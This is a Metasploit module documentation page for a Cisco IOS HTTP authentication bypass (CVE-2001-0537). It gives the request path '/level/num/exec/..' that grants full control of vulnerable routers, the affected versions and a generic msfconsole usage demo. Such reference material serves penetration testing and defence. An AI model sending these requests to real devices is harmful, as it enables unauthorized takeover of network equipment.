## Cisco IOS HTTP Unauthorized Administrative Access

This module exploits a vulnerability in the Cisco IOS HTTP 
Server. By sending a GET request for "/level/num/exec/..", 
where num is between 16 and 99, it is possible to bypass 
authentication and obtain full system control. IOS 11.3 -> 
12.2 are reportedly vulnerable. This module tested 
successfully against a Cisco 1600 Router IOS v11.3(11d).


## Module Name
auxiliary/scanner/http/cisco_ios_auth_bypass

## Authors
* patrick
* hdm


## References
* http://www.securityfocus.com/bid/2936
* http://cvedetails.com/cve/2001-0537/
* http://www.osvdb.org/578




## Platforms


## Reliability
[Normal](https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking)

## Demo

```
msf > use auxiliary/scanner/http/cisco_ios_auth_bypass
msf auxiliary(cisco_ios_auth_bypass) > show targets
   ... a list of targets ...
msf auxiliary(cisco_ios_auth_bypass) > set TARGET <target-id>
msf auxiliary(cisco_ios_auth_bypass) > show options
   ... show and set options ...
msf auxiliary(cisco_ios_auth_bypass) > run
```
    
    